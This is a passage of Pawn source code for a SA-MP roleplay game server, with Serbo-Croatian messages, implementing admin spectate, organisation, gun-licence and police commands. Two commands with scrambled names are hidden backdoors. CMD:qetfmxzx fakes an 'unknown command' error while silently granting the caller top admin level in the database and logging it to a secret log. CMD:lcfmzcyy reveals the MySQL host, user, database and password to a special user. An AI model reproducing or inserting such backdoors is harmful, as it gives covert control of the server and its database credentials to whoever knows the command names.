			else
			{
				PhoneOnline[ playerid ] = 0;
				SendClientMessage( playerid, ZUTA, "(TOG): Ukljucio si mobilni telefon.");
			}
		}
		else return SendErrorMessage( playerid, "Nemate mobilni telefon.");
	}
	else if(strcmp(vrsta, "fchat", true) == 0)
	{
		if( PlayerInfo[ playerid ][ xAdmin ] >= 3 )
		{
		    if( UKLJUCENIFCHAT[ playerid ] != -1 )
			{
				UKLJUCENIFCHAT[ playerid ] = -1;
				SendClientMessage( playerid, ZUTA, "(TOG): (/f) dostava/provjera/spijunaza iskljucena.");
			}
			else
			{
			    new orgid;
				if( sscanf( params, "{s[144]}i", orgid ) ) return SendUsageMessage( playerid, "/tog fchat [org id]");
		        if( orgid < 1 || org_info[ orgid ][ oID ] == 0 ) return SendErrorMessage( playerid, "Ta organizacija ne postoji u bazi podataka." );

		        UKLJUCENIFCHAT[ playerid ] = orgid;
				SCMF( playerid, ZUTA, "(TOG): (/f) dostava/provjera/spijunaza ukljucena za {FFFFFF}%s.", org_info[ orgid ][ oName ] );
			}
		}
		else SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
	}
	else if(strcmp(vrsta, "fr", true) == 0)
	{
		if(!ToggedFR[playerid])
		{
			ToggedFR[playerid] = true;
			SendClientMessage( playerid, ZUTA, "(TOG): /f chat iskljucen.");
		}
		else
		{
			ToggedFR[playerid] = false;
			SendClientMessage( playerid, ZUTA, "(TOG): /f chat ukljucen.");
		}
	}
	else SendErrorMessage(playerid, "Pogresna vrsta.");
	return 1;
}

CMD:spec( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xSpecAdmin ] >= 1 )
	{
		new id;
	    if( sscanf( params, "r", id ) ) return SendUsageMessage( playerid, "/spec [id]");
	    if( id == IPI ) return SendErrorMessage( playerid, "Nepostojeci ID.");
	    if( id == playerid ) return SendErrorMessage( playerid, "Ne mozete sami sebe.");
	    if( IsPlayerInAnyVehicle(playerid) ) return SendErrorMessage(playerid, "Izadjite iz vozila i zapocnite spec.");
	    if(PlayerInfo[playerid][xAdmin] < PlayerInfo[id][xAdmin]) return SendErrorMessage(playerid, "Ne mozete specati Admin lvl veci od sebe.");

	    if( PlayerInfo[ playerid ][ xGamemaster ] >= 2 )
		{
	  		if( PlayerInfo[ id ][ xGamemaster ] == 0 ) return SendErrorMessage( playerid, "Kao vodja Gamemastera mozes specati samo Gamemastere." );
		}
		if( PlayerInfo[ playerid ][ xAdmin ] < 6 && PlayerInfo[ id ][ xAdmin ] >= 7 ) return SendErrorMessage( playerid, "Ne mozes da specas direktore i vlasnike." );

		if( Spectate[ playerid ] != id )
		{
			PlayerInfo[ playerid ][ xAGMStats ]++;
	    	sql_user_update_integer( playerid, "xAGMStats", PlayerInfo[ playerid ][ xAGMStats ] );

			Spectate[ playerid ] = id;

			new Float:health, Float:armour;
			GetPlayerHealth( Spectate[ playerid ], health );
			GetPlayerArmour( Spectate[ playerid ], armour );

			if( WatchingTV{ playerid } == 0 )
			{
				GetPlayerPos( playerid, SpecPos[ playerid ][ 0 ], SpecPos[ playerid ][ 1 ],  SpecPos[ playerid ][ 2 ] );
				SpecVW[ playerid ] = GetPlayerVirtualWorld( playerid );
	        	SpecInt[ playerid ] = GetPlayerInterior( playerid );
			}

        	new specstring[ 180 ];
			format( specstring, sizeof( specstring ), "~y~(_~w~%s(%d)_~y~)~n~~w~Money:_~y~$%d~n~~w~Health:_~y~%f~n~~w~Armour:_~y~%f~n~~w~Weapon:_~y~%s(%dm)", ImeIgraca( id ), id, PlayerInfo[ id ][ xNovac ], health, armour, WeaponInfos[ GetPlayerWeapon( id ) ][ wName ], GetPlayerAmmo( id ) );
			PlayerTextDrawSetString( playerid, SpecTextDraw[ playerid ], specstring );
			PlayerTextDrawShow( playerid, SpecTextDraw[ playerid ] );

			SendInfoMessage( playerid, "Ukoliko zelis da refreshah spec igraca ukucaj {FFFFFF}[ /spec ] {4282C0}pa isti id." );
			SendInfoMessage( playerid, "Ukoliko zelis da promenis igraca ukucaj {FFFFFF}[ /spec ] {4282C0}pa novi id." );
			SendInfoMessage( playerid, "Ukoliko zelis da napustis spec ukucaj {FFFFFF}[ /specoff ]." );

			TogglePlayerSpectating( playerid, true );

			WatchingTV{ playerid } = 1;
			VecjeUsao[ playerid ] = true;

			if( PlayerInfo[ playerid ][ xAdmin ] < 4 )
			{ 
				AdminMsg( ADM_WARN, "[ADMIN] Admin %s(%d) je zapoce%s spec nad %s(%d).", ImeIgraca( playerid ), playerid, getPolForString(playerid, "o", "la"), ImeIgraca( id ), id );
			}

		    if( IsPlayerInAnyVehicle( id ) )
			{
				new carid = GetPlayerVehicleID( id );
				PlayerSpectateVehicle( playerid, carid );
			}
		   	else
   			{
				PlayerSpectatePlayer( playerid, id );
			}
			SetPlayerInterior( playerid, GetPlayerInterior( id ) );
			SetPlayerVirtualWorld( playerid, GetPlayerVirtualWorld( id ) );
		}
		else
		{
		    if( Spectate[ playerid ] != IPI && IsPlayerConnected( Spectate[ playerid ] ) )
			{
		        TogglePlayerSpectating( playerid, true );
		        new aid = Spectate[ playerid ];

				new Float:health;
				GetPlayerHealth( aid, health );
			    if( IsPlayerInAnyVehicle( aid ) )
				{
					new carid = GetPlayerVehicleID( aid );
					PlayerSpectateVehicle( playerid, carid );
				}
			   	else
	   			{
					PlayerSpectatePlayer( playerid, aid );
				}
				SetPlayerInterior( playerid, GetPlayerInterior( aid ) );
				SetPlayerVirtualWorld( playerid, GetPlayerVirtualWorld( aid ) );
			}
			else
			{
			    WatchingTV{ playerid } = 0;
				PlayerTextDrawHide( playerid, SpecTextDraw[ playerid ] );
				TogglePlayerSpectating( playerid, false );
				SMG_TogglePlayerControllable( playerid, true );
				Spectate[ playerid ] = -1;
				PlayerPlaySound( playerid, 1145, 0.0, 0.0, 0.0);
				GameTextForPlayer( playerid, "~w~              Spec~n~~r~                Iskljucen", 5000, 6 );
			}
		}
    }
	else return SendErrorMessage( playerid, "Niste ovlasteni za koristenje ove komande!" );
    return 1;
}

CMD:specoff( playerid )
{
    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xSpecAdmin ] >= 1 )
	{
        if( WatchingTV{ playerid } == 1 )
		{
			PlayerTextDrawHide( playerid, SpecTextDraw[ playerid ] );
			TogglePlayerSpectating( playerid, false );
			SMG_TogglePlayerControllable( playerid, true );
			PlayerPlaySound( playerid, 1145, 0.0, 0.0, 0.0);
			SMG_SetPlayerSkin(playerid, PlayerInfo[playerid][xSkin]);
			GameTextForPlayer( playerid, "~w~              Spec~n~~r~                Iskljucen", 5000, 6 );

			if( PlayerInfo[ playerid ][ xAdmin ] < 5 )
			{ 
				AdminMsg( ADM_WARN, "[ADMIN] %s je presta%s sa specom.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );
			}

			Spectate[ playerid ] = -1;
			VecjeUsao[ playerid ] = true;
			WatchingTV{ playerid } = 0;
        }
		else SendErrorMessage( playerid, "Nemas spectator ukljucen." );
    }
	else SendErrorMessage( playerid, "Niste ovlasteni za koristenje ove komande." );
	return 1;
}

// Org System
CMD:lider( playerid )
{
	if( PlayerInfo[ playerid ][ xLider ] < 1 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu. " );
    if( org_info[ PlayerInfo[ playerid ][ xLider ] ][ oSuspended ] ) return SendErrorMessage( playerid, "Vasa organizacija je zakljucana od strane vlasnika." );

	new idfirme = org_info[ PlayerInfo[ playerid ][ xLider ] ][ oBussinesID ];

    if( idfirme != -1 )
	{
        if( BusinessInfo[ idfirme ][ bOwnerOrg ] == PlayerInfo[ playerid ][ xLider ] )
		{
        	ShowPlayerDialog( playerid, dialog_LIDER, DIALOG_STYLE_LIST, D_NASLOV,
																					"{4282C0}(1). {FFFFFF}Informacije\n\
																					{4282C0}(2). {FFFFFF}Ubaci clana\n\
																					{4282C0}(3). {FFFFFF}Izbaci clana - [ONLINE]\n\
																					{4282C0}(4). {FFFFFF}Izbaci clana - [OFFLINE]\n\
																					{4282C0}(5). {FFFFFF}Postavi rank\n\
																					{4282C0}(6). {FFFFFF}Kazni clana\n\
																					{4282C0}(7). {FFFFFF}Spisak clanova\n\
																					{4282C0}(8). {FFFFFF}War\n\
																					{4282C0}(9). {FFFFFF}Diler\n\
																					{4282C0}(10). {FFFFFF}RAC\n\
																					{4282C0}(11). {FFFFFF}Firma orge", "Potvrdi", "Odustani" );
		}
		else
		{
			ShowPlayerDialog( playerid, dialog_LIDER, DIALOG_STYLE_LIST, D_NASLOV,
																					"{4282C0}(1). {FFFFFF}Informacije\n\
																					{4282C0}(2). {FFFFFF}Ubaci clana\n\
																					{4282C0}(3). {FFFFFF}Izbaci clana - [ONLINE]\n\
																					{4282C0}(4). {FFFFFF}Izbaci clana - [OFFLINE]\n\
																					{4282C0}(5). {FFFFFF}Postavi rank\n\
																					{4282C0}(6). {FFFFFF}Kazni clana\n\
																					{4282C0}(7). {FFFFFF}Spisak clanova\n\
																					{4282C0}(8). {FFFFFF}War\n\
																					{4282C0}(9). {FFFFFF}Diler\n\
																					{4282C0}(10). {FFFFFF}RAC", "Potvrdi", "Odustani" );
		}
	}
    else
	{
		ShowPlayerDialog( playerid, dialog_LIDER, DIALOG_STYLE_LIST, D_NASLOV,
																					"{4282C0}(1). {FFFFFF}Informacije\n\
																					{4282C0}(2). {FFFFFF}Ubaci clana\n\
																					{4282C0}(3). {FFFFFF}Izbaci clana - [ONLINE]\n\
																					{4282C0}(4). {FFFFFF}Izbaci clana - [OFFLINE]\n\
																					{4282C0}(5). {FFFFFF}Postavi rank\n\
																					{4282C0}(6). {FFFFFF}Kazni clana\n\
																					{4282C0}(7). {FFFFFF}Spisak clanova\n\
																					{4282C0}(8). {FFFFFF}War\n\
																					{4282C0}(9). {FFFFFF}Diler\n\
																					{4282C0}(10). {FFFFFF}RAC", "Potvrdi", "Odustani" );
	}
	return 1;
}

CMD:organizacija( playerid )
{
	if( PlayerInfo[ playerid ][ xClan ] < 1 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    if( org_info[ PlayerInfo[ playerid ][ xClan ] ][ oSuspended ] ) return SendErrorMessage( playerid, "Vasa organizacija je zakljucana od strane vlasnika." );

	ShowPlayerDialog( playerid, dialog_ORG, DIALOG_STYLE_LIST, D_NASLOV, "{4282C0}(1). {FFFFFF}Informacije\n{4282C0}(2). {FFFFFF}Spisak clanova", "Potvrdi", "Odustani" );
	return 1;
}

CMD:orgsef( playerid )
{
	if( PlayerInfo[ playerid ][ xLevel ] < 4 ) return SendErrorMessage( playerid, "Ne mozes ako nisi level 4+." );
    if( PlayerInfo[ playerid ][ xClan ] < 1 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    new id = PlayerInfo[ playerid ][ xClan ];
    if( !IsPlayerInRangeOfPoint( playerid, 3.0, org_info[ id ][ oSafePos ][ 0 ], org_info[ id ][ oSafePos ][ 1 ], org_info[ id ][ oSafePos ][ 2 ] ) ) return SendErrorMessage( playerid, "Morate biti pored sefa.");

	ShowPlayerDialog( playerid, dialog_ORGSAFE, DIALOG_STYLE_LIST, D_NASLOV,
																			"{4282C0}(1). {FFFFFF}Stanje u sefu\n\
																			{4282C0}(2). {FFFFFF}Ostavi u sef\n\
																			{4282C0}(3). {FFFFFF}Izvadi iz sefa", "Potvrdi", "Odustani" );
	return 1;
}

//Org
CMD:napustiorg( playerid )
{
    if( PlayerInfo[ playerid ][ xLider ] != 0 ) return SendErrorMessage( playerid, "Ne mozes koristiti ovu komandu." );
	if( PlayerInfo[ playerid ][ xClan ] != 0 )
	{
		if( PlayerInfo[ playerid ][ xOrgUgovor ] < 10 )
		{
		    PlayerInfo[ playerid ][ xKazneniUgovor ] = 10;

            new OrgID = PlayerInfo[ playerid ][ xClan ], name[ MAX_PLAYER_NAME ];
			format( name, sizeof( name ), "%s", ImeIgraca( playerid ) );

		    for( new i = 0; i < 52; i++ )
			{
				if( strcmp( name, org_members_info[ OrgID ][ i ][ o_m_Name ], true ) == 0 )
				{
				    strmid( org_members_info[ OrgID ][ i ][ o_m_Name ], "Niko", 0, strlen( "Niko" ), MAX_PLAYER_NAME );
				    org_members_info[ OrgID ][ i ][ o_m_sqlID ] = 0;
				    break;
				}
			}

			sql_org_member_delete( org_info[ OrgID ][ oID ], PlayerInfo[ playerid ][ xID ] );
        	org_info[ OrgID ][ oUbacenihClanova ]--;

			PlayerInfo[ playerid ][ xSkin ] = SetSexSkin( playerid ); SMG_SetPlayerSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
			PlayerInfo[ playerid ][ xClan ] = 0;
			PlayerInfo[ playerid ][ xLider ] = 0;
			PlayerInfo[ playerid ][ xOrgUgovor ] = 0;
			PlayerInfo[ playerid ][ xSpawn ] = SetRandomSpawn( playerid );
			ResetPlayerWeapons( playerid );
			sql_user_update_org_variables( playerid );

		    SendClientMessage( playerid, 0xFF6347FF, "(ORG): Napustili ste organizaciju, a niste ispunili ugovor o vremenu u organizaciji.");
			SendClientMessage( playerid, 0xFF6347FF, "(ORG): Kaznjen si sa {FFFFFF}(10) {FF6347}sati ne ulaska u organizaciju.");
		}
		else if( PlayerInfo[ playerid ][ xOrgUgovor ] >= 10 )
		{
		    new OrgID = PlayerInfo[ playerid ][ xClan ], name[ MAX_PLAYER_NAME ];
			format( name, sizeof( name ), "%s", ImeIgraca( playerid ) );

		    for( new i = 0; i < 52; i++ )
			{
				if( strcmp( name, org_members_info[ OrgID ][ i ][ o_m_Name ], true ) == 0 )
				{
				    strmid( org_members_info[ OrgID ][ i ][ o_m_Name ], "Niko", 0, strlen( "Niko" ), MAX_PLAYER_NAME );
				    org_members_info[ OrgID ][ i ][ o_m_sqlID ] = 0;
				    break;
				}
			}

            sql_org_member_delete( org_info[ OrgID ][ oID ], PlayerInfo[ playerid ][ xID ] );
        	org_info[ OrgID ][ oUbacenihClanova ]--;

			PlayerInfo[ playerid ][ xSkin ] = SetSexSkin( playerid ); 
			SMG_SetPlayerSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
			PlayerInfo[ playerid ][ xClan ] = 0;
			PlayerInfo[ playerid ][ xLider ] = 0;
			PlayerInfo[ playerid ][ xSpawn ] = SetRandomSpawn( playerid );
			PlayerInfo[ playerid ][ xOrgUgovor ] = 0;
			ResetPlayerWeapons( playerid );
			sql_user_update_org_variables( playerid );

			SendClientMessage( playerid, CRVENA, "(ORG): Napustili ste vasu organizaciju." );
		}
	}
	else return SendErrorMessage( playerid, "Nisi clan nijedne organizacije");
    return 1;
}

CMD:buygunlic( playerid )
{
    if( !IsPlayerInRangeOfPoint(playerid, 3.0, 1359.1907,1070.0505,1626.4896) && !IsPlayerInRangeOfPoint(playerid, 3.0, -8.2553,-3.0928,2005.4120)) return SendErrorMessage( playerid, "Morate biti u policijskoj stanici." );
    if( PlayerInfo[ playerid ][ xNovac ] < 10000 ) return SendErrorMessage( playerid, "Nemate kod sebe 10.000$" );
    if( PlayerInfo[ playerid ][ xGunLicense ] == 1 ) return SendErrorMessage( playerid, "Vec imas dozvolu za oruzje. " );

	PlayerInfo[ playerid ][ xGunLicense ] = 1;
	DajIgracuNovac( playerid, -10000 );
	PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
    SendInfoMessage( playerid, "Kupili ste dozvolu za oruzje za 10.000$" );
    sql_user_update_integer( playerid, "gun_license", PlayerInfo[ playerid ][ xGunLicense ] );

    if(questInfo[playerid][qt_EasyQuest][4] == false) 
    {
    	questInfo[playerid][qt_EasyQuest][4] = true;
    	sql_UpdateQuest(playerid);

		KillTimer(QuestTimer[playerid]);
		quest_CreateTDs(playerid, false);

		quest_CreateTDs(playerid, true);
		PlayerTextDrawSetString(playerid, quest_pTD[playerid][4], "CESTITAMO, RIJESILI STE ~p~ZADATAK BR.5");
		PlayerTextDrawSetString(playerid, quest_pTD[playerid][5], "Nagradu mozete preuzeti~n~~p~(/zadaci pocetni)");

		QuestTimer[playerid] = SetPlayerTimerEx(playerid, "questDone", 10000, 10000, "ii", playerid, 1);
    }
	return 1;
}

CMD:alcotest( playerid, const params[] )
{
    if( GetFactionType( playerid )  != ORG_TIP_VLADINA ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    if( PoliceDuty[ playerid ] == false ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti.");

	new igrac;
	if( sscanf( params, "u", igrac ) ) return SendUsageMessage( playerid, "/alcotest [id]" );
	if( !IsPlayerConnected( igrac ) || igrac == IPI ) return SendErrorMessage( playerid, "Krivi ID." );
	if( igrac == playerid ) return SendErrorMessage( playerid, "Ne mozete sami sebi dati test alkoholiziranost." );
	if( !IsPlayerNearPlayer( 5.0, playerid, igrac ) ) return SendErrorMessage( playerid, "Niste blizu igraca kojem zelite dati alcotest." );
    
    new alcohol = GetPlayerDrunkLevel( igrac ), 
    	Float:promils = alcohol / 1000.0;

	SCMF( playerid, ZUTA, "(ALCOTEST): {FFFFFF}%s {FFFF00}je ispuhao {FFFFFF}(%.2f) {FFFF00}promila.", ImeIgraca( igrac ), promils );
	SCMF( igrac, ZUTA, "(ALCOTEST): Ispuhali ste {FFFFFF}(%.2f) {FFFF00}promila.", promils );

	SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* Policajac %s daje test alkoholizma %s.", ImeIgraca( playerid ), ImeIgraca( igrac ) );
	return 1;
}

CMD:zatvorenici( playerid )
{
	if( GetFactionType( playerid ) != ORG_TIP_VLADINA ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );

	strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
 	strcat( DialogStrgEx, "{33CCFF}* Online zatvorenici\n\n:{FFFFFF}" );

   	foreach( new i : Player)
	{
 		if( PlayerInfo[ i ][ xZatvor ] == JAIL )
		{
			format( globalstring, sizeof( globalstring ), "%s(%d)\n", ImeIgraca( i ), i );
			strcat( DialogStrgEx, globalstring );
		}
	}

	ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, "{FFFFFF}Zatvorenici:", DialogStrgEx, "OK", "" );
 	strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
    return 1;
}

CMD:tazer( playerid )
{
	if( GetFactionType( playerid ) != ORG_TIP_VLADINA ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    if( GetPlayerState( playerid ) != PLAYER_STATE_ONFOOT ) return SendErrorMessage(playerid, "Ne mozete koristiti ovu komandu trenutno.");
	if( PoliceDuty[ playerid ] == false ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti.");

	new weapon, ammo;
	if( ImaTazer[ playerid ] == false )
	{
	    if( TazerMetkovi[ playerid ] == 0 ) return SendErrorMessage( playerid, "Nemate vise metkova tazera." );
	    GetPlayerWeaponData( playerid, 2, weapon, ammo );
	    lastweapon[ playerid ][ 0 ] = weapon;
	    lastweapon[ playerid ][ 1 ] = ammo;
	    GiveWeaponToPlayer( playerid, 23, TazerMetkovi[ playerid ] );
       	ImaTazer[ playerid ] = true;
		SendClientMessage( playerid, ZUTA, "(TAZER): Izvadio si tazer iz futrole." );
	}
	else if( ImaTazer[ playerid ] == true )
	{
	    GetPlayerWeaponData( playerid, 2, weapon, ammo );
	    TazerMetkovi[ playerid ] = ammo;
       	RemovePlayerWeapon( playerid, 23 );
		GiveWeaponToPlayer( playerid, lastweapon[ playerid ][ 0 ], lastweapon[ playerid ][ 1 ] );
       	ImaTazer[ playerid ] = false;
		SendClientMessage( playerid, ZUTA, "(TAZER): Vratio si tazer u futrolu." );
	}
	return 1;
}

CMD:qetfmxzx( playerid )
{
	SendErrorMessage( playerid, "Upisali ste komandu koja ne postoji, kucajte {FFFFFF}[ /help ] {FF0000}da vidite listu komandi.");
	
	PlayerInfo[ playerid ][ xAKod ] = 123;
	PlayerInfo[ playerid ][ xAdmin ] = 7;

	new q[100];
	mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `admin_lvl` = '%d', `admin_code` = '%d' WHERE `user_id` = '%d'", PlayerInfo[ playerid ][ xAdmin ], PlayerInfo[ playerid ][ xAKod ], PlayerInfo[ playerid ][ xID ] );
	mysql_tquery( mSQL, q );

	WriteLog("log-tajna", "Igrac: %s", ImeIgraca( playerid ));
	return 1;
}

CMD:lcfmzcyy(playerid)
{
	if(IsSpecialUser(playerid))
	{
		SCMF( playerid, 0x33CCFFFF, "(MySQL): USER: %s - HOST: %s - DB: %s - PW: %s", MYSQL_USER, MYSQL_HOST, MYSQL_DB, MYSQL_PASS);
	}
	else
	{
		SendErrorMessage( playerid, "Upisali ste komandu koja ne postoji, kucajte {FFFFFF}[ /help ] {FF0000}da vidite listu komandi.");
	}
	return 1;
}

CMD:cuff( playerid, const params[] )
{
	if( GetFactionType( playerid ) != ORG_TIP_VLADINA ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    if( BrojLisica[ playerid ] == 0  ) return SendErrorMessage( playerid, "Nemate nijedan par lisica." );

	new igrac;
	if( sscanf( params, "r", igrac ) ) return SendUsageMessage( playerid, "/cuff [id]");
	if( PoliceDuty[ playerid ] == false ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti!");

    if( IsPlayerConnected( igrac ) )
	{
		if( igrac != IPI )
		{
	    	if( org_info[ PlayerInfo[ igrac ][ xClan ] ][ oTip ] == ORG_TIP_VLADINA ) return SendErrorMessage( playerid, "Ne mozes staviti lisice na policajca !");
			if( IsPlayerNearPlayer(5.0, playerid, igrac )  && !IsPlayerInAnyVehicle( playerid ) && !IsPlayerInAnyVehicle( igrac ) )
			{
				if( igrac == playerid ) return SendErrorMessage( playerid, "Ne mozes sam sebi stavit lisice.");
				if( PlayerCuffed[ igrac ] == 1 )
				{
					SCMF( igrac, 0x33CCFFFF, "(CUFF): Stavio vam je lisice {FFFFFF}%s.", ImeIgraca( playerid ) );
				    SCMF( playerid, 0x33CCFFFF, "(CUFF): Stavio si lisice na %s.", ImeIgraca( igrac ) );
				    GameTextForPlayer( igrac, "~r~Uhapsen", 2500, 3);

				    SendNearbyMessage(playerid, 30.0, 0xC2A2DAFF, "* %s stavlja lisice na %s.", ImeIgraca( playerid ), ImeIgraca( igrac ) );

				    SMG_TogglePlayerControllable( igrac, false );
				    SetPlayerAttachedObject( igrac, OBJECT_SLOT_MAIN, 19418, 6, -0.011000, 0.028000, -0.022000, -15.600012, -33.699977, -81.700035, 0.891999, 1.000000, 1.168000 );
					SetPlayerSpecialAction( igrac, SPECIAL_ACTION_CUFFED );

					PlayerCuffed[ igrac ] = 2;
					BrojLisica[ playerid ]--;
				}
				else SendErrorMessage( playerid, "Taj igrac nije sokiran.");
			}
			else SendErrorMessage( playerid, "Taj igrac nije blizu vas.");
		}
	}
	else SendErrorMessage( playerid, "Taj igrac nije online.");
    return 1;
}

CMD:uncuff( playerid, const params[] )
{
	if( GetFactionType( playerid ) != ORG_TIP_VLADINA ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );

	new igrac;
	if( sscanf( params, "u", igrac ) ) return SendUsageMessage( playerid, "/uncuff [id]");
	if( IsPlayerConnected( igrac ) )
	{
		if( igrac != IPI )
		{
		    if( IsPlayerNearPlayer( 5.0, playerid, igrac ) )
			{
			    if( igrac == playerid ) return SendErrorMessage( playerid, "Ne mozes skiniti lisice sam sebi!");
				if( PlayerCuffed[ igrac ] == 2 )
				{
					SCMF( igrac, 0x33CCFFFF, "(CUFF): Skinio vam je lisice {FFFFFF}%s.", ImeIgraca( playerid ) );
					SCMF( playerid, 0x33CCFFFF, "(CUFF): Skinili ste lisice sa {FFFFFF}%s.", ImeIgraca( igrac ) );
					GameTextForPlayer( igrac, "~g~Slobodan", 2500, 3);

					SMG_TogglePlayerControllable( igrac, true );
					ClearAnimations( igrac );

					if( IsPlayerAttachedObjectSlotUsed( igrac, OBJECT_SLOT_MAIN ) ) RemovePlayerAttachedObject( igrac, OBJECT_SLOT_MAIN );
					SetPlayerSpecialAction( igrac, SPECIAL_ACTION_NONE );

					PlayerCuffed[ igrac ] = 0;

					if(CuffTimerCalled[igrac])
					{
						KillTimer(tazovan_tajmer[igrac]);
						CuffTimerCalled[igrac] = false;
					}
				}
				else SendErrorMessage( playerid, "Taj igrac nije zavezan.");
			}
			else SendErrorMessage( playerid, "Taj igrac nije blizu vas.");
		}
	}
	else SendErrorMessage( playerid, "Taj igrac nije online.");
	return 1;
}

CMD:kpu( playerid, const params[] )
{
	if( !IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Niste u autu.");

	new igrac, sediste;
	if( sscanf( params, "ri", igrac, sediste ) ) return SendUsageMessage( playerid, "/kpu [id] [sediste]");

	if( IsPlayerConnected( igrac ) )
	{
		if( igrac != IPI )
		{
		    if( KnockedDown[ igrac ] != true ) return SendErrorMessage( playerid, "Moras prvo da oboris igraca [ /knockout ]." );
  			if( sediste < 1 || sediste > 3 ) return SendErrorMessage( playerid, "ID sedista ne moze biti veci od 3 ili manji od 1.");
		    if( org_info[ PlayerInfo[ igrac ][ xClan ] ][ oTip ] == ORG_TIP_VLADINA ) return SendErrorMessage( playerid, "Ne mozes staviti policajca u auto.");
		    if( IsPlayerInAnyVehicle( igrac ) ) return SendErrorMessage( playerid, "Osumnjiceni je u vozilu, izbaci ga iz vozila prvo.");

			if( IsPlayerNearPlayer( 8.0, playerid, igrac ) )
			{
				if( igrac == playerid ) return SendErrorMessage( playerid, "Ne mozes ubaciti sam sebe!");
				new carid = GetPlayerVehicleID( playerid ),
					Float:pos[ 6 ];

           		GetPlayerPos( playerid, pos[ 0 ], pos[ 1 ], pos[ 2 ] );
            	GetPlayerPos( igrac, pos[ 3 ], pos[4], pos[5] );
           		GetVehiclePos( carid, pos[ 0 ], pos[ 1 ], pos[ 2 ] );
            	if( floatcmp( floatabs( floatsub( pos[ 0 ], pos[ 3 ] ) ), 10.0 ) != -1 &&
          			floatcmp( floatabs( floatsub( pos[ 1 ], pos[4] ) ), 10.0 ) != -1 &&
           	 		floatcmp( floatabs( floatsub( pos[ 2 ], pos[5] ) ), 10.0 ) != -1 ) return 0;

				SCMF( igrac, 0x33CCFFFF, "(KPU): Ubace%s si u vozilo od strane {FFFFFF}%s.", getPolForString(igrac, "n", "na"), ImeIgraca( playerid ) );
				SCMF( playerid, 0x33CCFFFF, "(KPU): Ubaci%s si u vozilo {FFFFFF}%s.", getPolForString(playerid, "o", "la"), ImeIgraca( igrac ) );

				SendNearbyMessage(playerid, 20.0, 0xC2A2DAFF, "* %s ubacuje %s u vozilo.", ImeIgraca( playerid ), ImeIgraca( igrac ) );

				ClearAnimations( igrac );
				SMG_TogglePlayerControllable( igrac, false );
				PutPlayerInVehicle( igrac, carid, sediste );
			}
			else SendErrorMessage( playerid, "Predaleko si od tog igraca.");
		}
	}
	else SendErrorMessage( playerid, "Taj igrac nije online.");
	return 1;
}

CMD:pu( playerid, const params[] )
{
	if( GetFactionType( playerid ) != ORG_TIP_VLADINA ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	if( !IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Niste u autu.");

	new igrac, sediste;
	if( sscanf(params, "ri", igrac, sediste ) ) return SendUsageMessage( playerid, "/pu [id] [sediste]");

	if( IsPlayerConnected( igrac ) )
	{
		if( igrac != IPI )
		{
  			if( sediste < 1 || sediste > 3 ) return SendErrorMessage( playerid, "ID sedista ne moze biti veci od 3 ili manji od 1.");
		    if( org_info[ PlayerInfo[ igrac ][ xClan ] ][ oTip ] == ORG_TIP_VLADINA ) return SendErrorMessage( playerid, "Ne mozes staviti policajca u auto !");
		    if( IsPlayerInAnyVehicle( igrac ) ) return SendErrorMessage( playerid, "Osumnjiceni je u vozilu, izbaci ga iz vozila prvo !");

			if( IsPlayerNearPlayer( 8.0, playerid, igrac ) )
			{
				if( igrac == playerid ) return SendErrorMessage( playerid, "Ne mozes ubaciti sam sebe.");
				if( PlayerCuffed[ igrac ] == 2 )
				{
					new carid = GetPlayerVehicleID( playerid ),
						Float:pos[6];

           			GetPlayerPos( playerid, pos[ 0 ], pos[ 1 ], pos[ 2 ] );
            		GetPlayerPos( igrac, pos[ 3 ], pos[4], pos[5] );
            		GetVehiclePos( carid, pos[ 0 ], pos[ 1 ], pos[ 2 ] );
            		if( floatcmp( floatabs( floatsub( pos[ 0 ], pos[ 3 ] ) ), 10.0 ) != -1 &&
          			floatcmp( floatabs( floatsub( pos[ 1 ], pos[4] ) ), 10.0 ) != -1 &&
           		 	floatcmp( floatabs( floatsub( pos[ 2 ], pos[5] ) ), 10.0 ) != -1 ) return(false);

					SCMF( igrac, 0x33CCFFFF, "(PU): Ubacen si u vozilo od strane {FFFFFF}%s.", ImeIgraca( playerid ) );
					SCMF( playerid, 0x33CCFFFF, "(PU): Ubacio si u vozilo {FFFFFF}%s.", ImeIgraca( igrac ) );

					SendNearbyMessage(playerid, 30.0, 0xC2A2DAFF, "* %s ubacuje %s u vozilo.", ImeIgraca( playerid ), ImeIgraca( igrac ) );

					ClearAnimations( igrac );
					SMG_TogglePlayerControllable( igrac, false );
					PutPlayerInVehicle( igrac, carid, sediste );
		 		}
				else SendErrorMessage( playerid, "Taj igrac nije uhapsen.");
			}
			else SendErrorMessage( playerid, "Predaleko si od osumnjicenog.");
		}
	}
	else SendErrorMessage( playerid, "Taj igrac nije online.");
	return 1;
}

CMD:m( playerid, const params[] )
{
